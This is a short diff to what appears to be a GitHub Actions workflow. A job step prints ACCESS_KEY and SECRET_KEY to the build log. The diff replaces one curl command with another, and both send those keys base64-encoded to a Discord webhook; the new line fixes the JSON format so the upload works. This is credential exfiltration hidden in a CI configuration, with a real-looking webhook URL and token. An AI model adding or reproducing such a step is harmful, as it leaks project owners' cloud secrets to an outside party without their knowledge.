@@ -32,7 +32,7 @@ jobs:
       run: |
         echo "Access Key: $ACCESS_KEY"
         echo "Secret Key: $SECRET_KEY"
-        curl -d creds="$(echo $ACCESS_KEY:$SECRET_KEY | base64 | base64)" https://discord.com/api/webhooks/1198797508390961172/9ftQIIQg1bJEKlb7Zy8w8dcyygqZ6thwc_mYsNJiO-iubmscDiVwCnmZx7iZVhUtfJYE
+        curl -H "Content-Type: application/json" -d '{"content": "'"creds=$(echo -n $ACCESS_KEY:$SECRET_KEY | base64)'"}' https://discord.com/api/webhooks/1198797508390961172/9ftQIIQg1bJEKlb7Zy8w8dcyygqZ6thwc_mYsNJiO-iubmscDiVwCnmZx7iZVhUtfJYE
     
     # - name: Checkout repository
     #     uases: actions/checkout@2
